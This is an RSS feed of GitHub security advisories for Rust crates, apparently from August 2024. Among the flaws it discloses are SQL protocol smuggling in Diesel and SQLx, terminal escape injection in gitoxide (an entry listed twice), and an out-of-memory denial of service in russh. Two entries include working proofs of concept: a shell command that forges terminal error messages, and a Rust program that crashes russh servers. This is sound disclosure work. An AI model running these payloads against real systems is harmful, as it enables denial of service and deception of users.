<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2024-08-23T19:01:26.971Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[diesel] Diesel vulnerable to Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts]]></title>
        <id>https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</id>
        <link href="https://github.com/advisories/GHSA-wq9x-qwcq-mmgf"/>
        <updated>2024-08-23T18:51:21.000Z</updated>
        <content type="html"><![CDATA[<p>The following presentation at this year's DEF CON was brought to our attention on the Diesel Gitter Channel:</p>
<blockquote>
<p>SQL Injection isn't Dead: Smuggling Queries at the Protocol Level<br><a href="http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</a><br>(Archive link for posterity.)
Essentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, 
causing the server to interpret the rest of the string as binary protocol commands or other data.</p>
</blockquote>
<p>It appears Diesel <em>does</em> perform truncating casts in a way that could be problematic, 
for example: <a href="https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36">https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36</a></p>
<p>This code has existed essentially since the beginning, 
so it is reasonable to assume that all published versions <code>&lt;= 2.2.2</code> are affected.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The prefered migration to the outlined problem is to update to a Diesel version newer than 2.2.2, which includes 
fixes for the problem. </p>
<p>As always, you should make sure your application is validating untrustworthy user input. 
Reject any input over 4 GiB, or any input that could <em>encode</em> to a string longer than 4 GiB. 
Dynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.</p>
<p>For web application backends, consider adding some middleware that limits the size of request bodies by default.</p>
<h2 id="resolution">Resolution</h2>
<p>Diesel now uses <code>#[deny]</code> directives for the following Clippy lints:</p>
<ul>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation"><code>cast_possible_truncation</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap"><code>cast_possible_wrap</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss"><code>cast_sign_loss</code></a></li>
</ul>
<p>to prevent casts that will lead to precision loss or other trunctations. Additionally we performed an 
audit of the relevant code.</p>
<p>A fix is included in the <code>2.2.3</code> release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel/pull/4170">https://github.com/diesel-rs/diesel/pull/4170</a></li>
<li><a href="https://github.com/diesel-rs/diesel/commit/9eccd7d6d705ac53618bfd478152e32ec3b4536c">https://github.com/diesel-rs/diesel/commit/9eccd7d6d705ac53618bfd478152e32ec3b4536c</a></li>
<li><a href="https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36">https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0365.html">https://rustsec.org/advisories/RUSTSEC-2024-0365.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wq9x-qwcq-mmgf">https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-23T18:51:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide-core] gitoxide-core does not neutralize special characters for terminals]]></title>
        <id>https://github.com/advisories/GHSA-88g2-r9rw-g55h</id>
        <link href="https://github.com/advisories/GHSA-88g2-r9rw-g55h"/>
        <updated>2024-08-23T13:42:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>gix</code> and <code>ein</code> commands write pathnames and other metadata literally to terminals, even if they contain characters terminals treat specially, including ANSI escape sequences. This sometimes allows an untrusted repository to misrepresent its contents and to alter or concoct error messages.</p>
<h3 id="details">Details</h3>
<p><code>gitoxide-core</code>, which provides most underlying functionality of the <code>gix</code> and <code>ein</code> commands, does not neutralize newlines, backspaces, or control characters—including those that form ANSI escape sequences—that appear in a repository's paths, author and committer names, commit messages, or other metadata. Such text may be written as part of the output of a command, as well as appearing in error messages when an operation fails.</p>
<p>ANSI escape sequences are of particular concern because, when printed to a terminal, they can change colors, including to render subsequent text unreadable; reposition the cursor to write text in a different location, including where text has already been written; clear the terminal; set the terminal title-bar text to arbitrary values; render the terminal temporarily unusable; and other such operations.</p>
<p>The effect is mostly an annoyance. But the author of a malicious repository who can predict how information from the repository may be accessed can cause files in the repository to be concealed or otherwise misrepresented, as well as rewrite all or part of error messages, or mimic error messages convincingly by repositioning the cursor and writing colored text.</p>
<h3 id="poc">PoC</h3>
<p>On a Unix-like system in a POSIX-compatible shell, run:</p>
<pre><code class="language-sh">git init misleading-path
cd misleading-path
touch "$(printf '\033]0;Boo!\007\033[2K\r\033[91mError: Repository is corrupted. Run \033[96mEVIL_COMMAND\033[91m to attempt recovery.\033[0m')"
git add .
git commit -m 'Initial commit'
</code></pre>
<p>In the repository—or, if desired, in a clone of it, to show that this is exploitable by getting a user to clone an untrusted repository—run this command, which outputs entries in a three-column form showing type, hash, and filename:</p>
<pre><code class="language-sh">gix tree entries
</code></pre>
<p>Although the output is of that form, it does not appear to be. Instead, the output in a terminal looks like this, colorized to appear to be an error message, with <code>EVIL_COMMAND</code> in another color, and with no other text:</p>
<pre><code class="language-text">Error: Repository is corrupted. Run EVIL_COMMAND to attempt recovery.
</code></pre>
<p>In some terminals, a beep or other sound will be made. In most terminals, the title bar text will be changed to <code>Boo!</code>, though in some shells this may be immediately undone when printing the prompt. These elements are included to showcase the abilities of ANSI escape sequences, but they are not usually themselves threats.</p>
<p>To see what is actually produced, <code>gix tree entries</code> can be piped to a command that displays special characters symbolically, such as <code>less</code> or <code>cat -v</code> if available.</p>
<pre><code class="language-text">BLOB e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 ESC]0;Boo!^GESC[2K^MESC[91mError: Repository is corrupted. Run ESC[96mEVIL_COMMANDESC[91m to attempt recovery.ESC[0m
</code></pre>
<p>That shows the effect on <code>gix tree entries</code>, but various other commands are also affected, and the escape sequences and other special characters can also appear in non-path metadata, such as in the <code>user.name</code> used to create a commit.</p>
<h3 id="impact">Impact</h3>
<p>For users who do not clone or operate in clones of untrusted repositories, there is no impact.</p>
<p>Windows is much less affected than Unix-like systems due to limitations on what characters can appear in filenames, and because traditionally Windows terminals do not support as many ANSI escape sequences.</p>
<p>Because different <code>gix</code> and <code>ein</code> commands display different data in different formats, the author of a malicious repository must guess how it will be used, which complicates crafting truly convincing output, though it may be possible to craft a repository where <code>gix clone</code> fails to clone it but produces a misleading message.</p>
<p>Although this is mainly exploitable on systems <em>other</em> than Windows, in the ability to produce misleading output this superficially resembles CVE-2024-35197. But this is much more limited, because:</p>
<ul>
<li>The misleading output can only be made to go where the application is already sending output. Redirection is not defeated, and devices to access cannot be chosen by the attacker.</li>
<li>The misleading output can only be take place <em>when</em> the application is already producing output. This limitation complicates the production of believable messages.</li>
<li>Only terminals are affected. Even if a standard stream is redirected to another file or device, these special characters would not have a special effect, unless echoed later without sanitization.</li>
<li>Reading and blocking cannot be performed.</li>
<li>Applications other than the gitoxide <code>gix</code> and <code>ein</code> executables are unaffected. The exception is if another application uses <code>gitoxide-core</code>. But this is explicitly discouraged in the <code>gitoxide-core</code> documentation and is believed to be rare.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h">https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43785">https://nvd.nist.gov/vuln/detail/CVE-2024-43785</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0364.html">https://rustsec.org/advisories/RUSTSEC-2024-0364.html</a></li>
<li><a href="https://github.com/advisories/GHSA-88g2-r9rw-g55h">https://github.com/advisories/GHSA-88g2-r9rw-g55h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88g2-r9rw-g55h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-22T16:41:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide] gitoxide-core does not neutralize special characters for terminals]]></title>
        <id>https://github.com/advisories/GHSA-88g2-r9rw-g55h</id>
        <link href="https://github.com/advisories/GHSA-88g2-r9rw-g55h"/>
        <updated>2024-08-23T13:42:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>gix</code> and <code>ein</code> commands write pathnames and other metadata literally to terminals, even if they contain characters terminals treat specially, including ANSI escape sequences. This sometimes allows an untrusted repository to misrepresent its contents and to alter or concoct error messages.</p>
<h3 id="details">Details</h3>
<p><code>gitoxide-core</code>, which provides most underlying functionality of the <code>gix</code> and <code>ein</code> commands, does not neutralize newlines, backspaces, or control characters—including those that form ANSI escape sequences—that appear in a repository's paths, author and committer names, commit messages, or other metadata. Such text may be written as part of the output of a command, as well as appearing in error messages when an operation fails.</p>
<p>ANSI escape sequences are of particular concern because, when printed to a terminal, they can change colors, including to render subsequent text unreadable; reposition the cursor to write text in a different location, including where text has already been written; clear the terminal; set the terminal title-bar text to arbitrary values; render the terminal temporarily unusable; and other such operations.</p>
<p>The effect is mostly an annoyance. But the author of a malicious repository who can predict how information from the repository may be accessed can cause files in the repository to be concealed or otherwise misrepresented, as well as rewrite all or part of error messages, or mimic error messages convincingly by repositioning the cursor and writing colored text.</p>
<h3 id="poc">PoC</h3>
<p>On a Unix-like system in a POSIX-compatible shell, run:</p>
<pre><code class="language-sh">git init misleading-path
cd misleading-path
touch "$(printf '\033]0;Boo!\007\033[2K\r\033[91mError: Repository is corrupted. Run \033[96mEVIL_COMMAND\033[91m to attempt recovery.\033[0m')"
git add .
git commit -m 'Initial commit'
</code></pre>
<p>In the repository—or, if desired, in a clone of it, to show that this is exploitable by getting a user to clone an untrusted repository—run this command, which outputs entries in a three-column form showing type, hash, and filename:</p>
<pre><code class="language-sh">gix tree entries
</code></pre>
<p>Although the output is of that form, it does not appear to be. Instead, the output in a terminal looks like this, colorized to appear to be an error message, with <code>EVIL_COMMAND</code> in another color, and with no other text:</p>
<pre><code class="language-text">Error: Repository is corrupted. Run EVIL_COMMAND to attempt recovery.
</code></pre>
<p>In some terminals, a beep or other sound will be made. In most terminals, the title bar text will be changed to <code>Boo!</code>, though in some shells this may be immediately undone when printing the prompt. These elements are included to showcase the abilities of ANSI escape sequences, but they are not usually themselves threats.</p>
<p>To see what is actually produced, <code>gix tree entries</code> can be piped to a command that displays special characters symbolically, such as <code>less</code> or <code>cat -v</code> if available.</p>
<pre><code class="language-text">BLOB e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 ESC]0;Boo!^GESC[2K^MESC[91mError: Repository is corrupted. Run ESC[96mEVIL_COMMANDESC[91m to attempt recovery.ESC[0m
</code></pre>
<p>That shows the effect on <code>gix tree entries</code>, but various other commands are also affected, and the escape sequences and other special characters can also appear in non-path metadata, such as in the <code>user.name</code> used to create a commit.</p>
<h3 id="impact">Impact</h3>
<p>For users who do not clone or operate in clones of untrusted repositories, there is no impact.</p>
<p>Windows is much less affected than Unix-like systems due to limitations on what characters can appear in filenames, and because traditionally Windows terminals do not support as many ANSI escape sequences.</p>
<p>Because different <code>gix</code> and <code>ein</code> commands display different data in different formats, the author of a malicious repository must guess how it will be used, which complicates crafting truly convincing output, though it may be possible to craft a repository where <code>gix clone</code> fails to clone it but produces a misleading message.</p>
<p>Although this is mainly exploitable on systems <em>other</em> than Windows, in the ability to produce misleading output this superficially resembles CVE-2024-35197. But this is much more limited, because:</p>
<ul>
<li>The misleading output can only be made to go where the application is already sending output. Redirection is not defeated, and devices to access cannot be chosen by the attacker.</li>
<li>The misleading output can only be take place <em>when</em> the application is already producing output. This limitation complicates the production of believable messages.</li>
<li>Only terminals are affected. Even if a standard stream is redirected to another file or device, these special characters would not have a special effect, unless echoed later without sanitization.</li>
<li>Reading and blocking cannot be performed.</li>
<li>Applications other than the gitoxide <code>gix</code> and <code>ein</code> executables are unaffected. The exception is if another application uses <code>gitoxide-core</code>. But this is explicitly discouraged in the <code>gitoxide-core</code> documentation and is believed to be rare.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h">https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43785">https://nvd.nist.gov/vuln/detail/CVE-2024-43785</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0364.html">https://rustsec.org/advisories/RUSTSEC-2024-0364.html</a></li>
<li><a href="https://github.com/advisories/GHSA-88g2-r9rw-g55h">https://github.com/advisories/GHSA-88g2-r9rw-g55h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88g2-r9rw-g55h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-22T16:41:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[miniscript] Miniscript allows stack consumption]]></title>
        <id>https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</id>
        <link href="https://github.com/advisories/GHSA-rv9v-r4vm-gj8x"/>
        <updated>2024-08-21T17:50:04.000Z</updated>
        <content type="html"><![CDATA[<p>The Miniscript (aka rust-miniscript) library before 12.2.0 for Rust allows stack consumption because it does not properly track tree depth.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-44073">https://nvd.nist.gov/vuln/detail/CVE-2024-44073</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/pull/704">https://github.com/rust-bitcoin/rust-miniscript/pull/704</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/pull/712">https://github.com/rust-bitcoin/rust-miniscript/pull/712</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/compare/11.2.0...12.2.0">https://github.com/rust-bitcoin/rust-miniscript/compare/11.2.0...12.2.0</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/commit/5b0f5e3417f027a22b066debf825dbe6644b575b">https://github.com/rust-bitcoin/rust-miniscript/commit/5b0f5e3417f027a22b066debf825dbe6644b575b</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/commit/8f54b5e3fb7129ed9fbed53f1cb9e6e62ea4c151">https://github.com/rust-bitcoin/rust-miniscript/commit/8f54b5e3fb7129ed9fbed53f1cb9e6e62ea4c151</a></li>
<li><a href="https://github.com/advisories/GHSA-rv9v-r4vm-gj8x">https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-19T03:30:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sqlx] SQLx Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts]]></title>
        <id>https://github.com/advisories/GHSA-xmrp-424f-vfpx</id>
        <link href="https://github.com/advisories/GHSA-xmrp-424f-vfpx"/>
        <updated>2024-08-19T16:02:08.000Z</updated>
        <content type="html"><![CDATA[<p>The following presentation at this year's DEF CON was brought to our attention on the SQLx Discord:</p>
<blockquote>
<p>SQL Injection isn't Dead: Smuggling Queries at the Protocol Level<br><a href="http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</a><br>(Archive link for posterity.)</p>
</blockquote>
<p>Essentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, 
causing the server to interpret the rest of the string as binary protocol commands or other data.</p>
<p>It appears SQLx <em>does</em> perform truncating casts in a way that could be problematic, 
for example: <a href="https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163">https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163</a></p>
<p>This code has existed essentially since the beginning, 
so it is reasonable to assume that all published versions <code>&lt;= 0.8.0</code> are affected.</p>
<h2 id="mitigation">Mitigation</h2>
<p>As always, you should make sure your application is validating untrustworthy user input. 
Reject any input over 4 GiB, or any input that could <em>encode</em> to a string longer than 4 GiB. 
Dynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.</p>
<p><a href="https://docs.rs/sqlx/latest/sqlx/trait.Encode.html#method.size_hint"><code>Encode::size_hint()</code></a> 
can be used for sanity checks, but do not assume that the size returned is accurate. 
For example, the <code>Json&lt;T&gt;</code> and <code>Text&lt;T&gt;</code> adapters have no reasonable way to predict or estimate the final encoded size, 
so they just return <code>size_of::&lt;T&gt;()</code> instead.</p>
<p>For web application backends, consider adding some middleware that limits the size of request bodies by default.</p>
<h2 id="resolution">Resolution</h2>
<p>Work has started on a branch to add <code>#[deny]</code> directives for the following Clippy lints:</p>
<ul>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation"><code>cast_possible_truncation</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap"><code>cast_possible_wrap</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss"><code>cast_sign_loss</code></a></li>
</ul>
<p>and to manually audit the code that they flag.</p>
<p>A fix is expected to be included in the <code>0.8.1</code> release (still WIP as of writing).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/launchbadge/sqlx/issues/3440">https://github.com/launchbadge/sqlx/issues/3440</a></li>
<li><a href="https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163">https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0363.html">https://rustsec.org/advisories/RUSTSEC-2024-0363.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xmrp-424f-vfpx">https://github.com/advisories/GHSA-xmrp-424f-vfpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xmrp-424f-vfpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-19T16:02:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[alloy-json-abi] Stack overflow when parsing specially crafted JSON ABI strings]]></title>
        <id>https://github.com/advisories/GHSA-8327-84cj-8xjm</id>
        <link href="https://github.com/advisories/GHSA-8327-84cj-8xjm"/>
        <updated>2024-08-15T22:10:08.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of the <code>alloy-json-abi</code> crate did not properly handle parsing of malformatted JSON ABI strings. The <code>JsonAbi::parse</code> method can be tricked into a stack overflow when processing specially crafted input. </p>
<p>This stack overflow can lead to a crash of the application using this crate, potentially causing a denial of service.</p>
<p>The flaw was corrected in commit <a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">4790c47</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/alloy-rs/core/issues/702">https://github.com/alloy-rs/core/issues/702</a></li>
<li><a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0362.html">https://rustsec.org/advisories/RUSTSEC-2024-0362.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8327-84cj-8xjm">https://github.com/advisories/GHSA-8327-84cj-8xjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8327-84cj-8xjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T22:10:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] Russh has an OOM Denial of Service due to allocation of untrusted amount]]></title>
        <id>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</id>
        <link href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg"/>
        <updated>2024-08-21T18:59:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Allocating an untrusted amount of memory allows any unauthenticated user to OOM a russh server.</p>
<h3 id="details">Details</h3>
<p>An SSH packet consists of a 4-byte big-endian length, followed by a byte stream of this length.
After parsing and potentially decrypting the 4-byte length, russh allocates enough memory for this bytestream, as a performance optimization to avoid reallocations later.</p>
<p><a href="https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254">https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254</a></p>
<p>But this length is entirely untrusted and can be set to any value by the client, causing this much memory to be allocated, which will cause the process to OOM within a few such requests.</p>
<p>RFC 4253 contains an explicit section on packet length limits: <a href="https://datatracker.ietf.org/doc/html/rfc4253#section-6.1">https://datatracker.ietf.org/doc/html/rfc4253#section-6.1</a></p>
<blockquote>
<p>However, implementations SHOULD check that the packet length is reasonable in order for the implementation to avoid denial of service and/or buffer overflow attacks.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>Running the <code>echoserver</code> example on port 2222 (<code>cd russh &amp;&amp; cargo run --release --example echoserver</code>), the provided Rust program can be executed against this echoserver and will cause it to OOM within a few tries.</p>
<details>
<summary>Rust code to run against the echo server</summary>

<p><code>Cargo.toml</code></p>
<pre><code class="language-toml">[package]
name = "poc"
version = "0.1.0"
edition = "2021"

[dependencies]
hex-literal = "=0.4.1"
</code></pre>
<p><code>main.rs</code></p>
<pre><code class="language-rust">use std::time::Duration;
use std::{error::Error, net::SocketAddr};

use std::{
    io::{Read, Write},
    net::TcpStream,
};

fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    loop {
        attempt()?;
        eprintln!("still running, trying again in a few seconds");
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn attempt() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    for i in 0..5 {
        eprintln!("iteration {i}");
        let mut s = TcpStream::connect("0.0.0.0:2222".parse::&lt;SocketAddr&gt;().unwrap())?;
        s.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
        s.read(&amp;mut [0; 1000])?;
        // A KeyExchangeInit copied from an OpenSSH client run but the length has been replaced with 0xFFFFFF00.
        s.write_all(&amp;hex_literal::hex!(
            "
        ffffff00071401af35150e67f2bc6dc4bc6b5330901900000131736e74727570373631783235353
        1392d736861353132406f70656e7373682e636f6d2c637572766532353531392d7368613235362c
        637572766532353531392d736861323536406c69627373682e6f72672c656364682d736861322d6
        e697374703235362c656364682d736861322d6e697374703338342c656364682d736861322d6e69
        7374703532312c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d73686
        13235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669
        652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2
        d67726f757031342d7368613235362c6578742d696e666f2d632c6b65782d7374726963742d632d
        763030406f70656e7373682e636f6d000001cf7373682d656432353531392d636572742d7630314
        06f70656e7373682e636f6d2c65636473612d736861322d6e697374703235362d636572742d7630
        31406f70656e7373682e636f6d2c65636473612d736861322d6e697374703338342d636572742d7
        63031406f70656e7373682e636f6d2c65636473612d736861322d6e697374703532312d63657274
        2d763031406f70656e7373682e636f6d2c736b2d7373682d656432353531392d636572742d76303
        1406f70656e7373682e636f6d2c736b2d65636473612d736861322d6e697374703235362d636572
        742d763031406f70656e7373682e636f6d2c7273612d736861322d3531322d636572742d7630314
        06f70656e7373682e636f6d2c7273612d736861322d3235362d636572742d763031406f70656e73
        73682e636f6d2c7373682d656432353531392c65636473612d736861322d6e697374703235362c6
        5636473612d736861322d6e697374703338342c65636473612d736861322d6e697374703532312c
        736b2d7373682d65643235353139406f70656e7373682e636f6d2c736b2d65636473612d7368613
        22d6e69737470323536406f70656e7373682e636f6d2c7273612d736861322d3531322c7273612d
        736861322d3235360000006c63686163686132302d706f6c7931333035406f70656e7373682e636
        f6d2c6165733132382d6374722c6165733139322d6374722c6165733235362d6374722c61657331
        32382d67636d406f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636
        f6d0000006c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c61657331
        32382d6374722c6165733139322d6374722c6165733235362d6374722c6165733132382d67636d4
        06f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636f6d000000d575
        6d61632d36342d65746d406f70656e7373682e636f6d2c756d61632d3132382d65746d406f70656
        e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c68
        6d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861312d6
        5746d406f70656e7373682e636f6d2c756d61632d3634406f70656e7373682e636f6d2c756d6163
        2d313238406f70656e7373682e636f6d2c686d61632d736861322d3235362c686d61632d7368613
        22d3531322c686d61632d73686131000000d5756d61632d36342d65746d406f70656e7373682e63
        6f6d2c756d61632d3132382d65746d406f70656e7373682e636f6d2c686d61632d736861322d323
        5362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322d65746d406f7065
        6e7373682e636f6d2c686d61632d736861312d65746d406f70656e7373682e636f6d2c756d61632
        d3634406f70656e7373682e636f6d2c756d61632d313238406f70656e7373682e636f6d2c686d61
        632d736861322d3235362c686d61632d736861322d3531322c686d61632d736861310000001a6e6
        f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f
        70656e7373682e636f6d2c7a6c69620000000000000000000000000000000000000000
        "
        ))?;

        s.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>Due to this allocation, a russh server can be brought to OOM, causing a DoS.
Since this happens before authentication, it can be done by any user that has access to the TCP port over the internet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
<li><a href="https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55">https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43410">https://nvd.nist.gov/vuln/detail/CVE-2024-43410</a></li>
<li><a href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T21:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boa_engine] Boa has an uncaught exception when transitioning the state of `AsyncGenerator` objects]]></title>
        <id>https://github.com/advisories/GHSA-f67q-wr6w-23jq</id>
        <link href="https://github.com/advisories/GHSA-f67q-wr6w-23jq"/>
        <updated>2024-08-15T21:37:58.000Z</updated>
        <content type="html"><![CDATA[<p>A wrong assumption made when handling ECMAScript's <code>AsyncGenerator</code> operations can cause an uncaught exception on certain scripts.</p>
<h2 id="details">Details</h2>
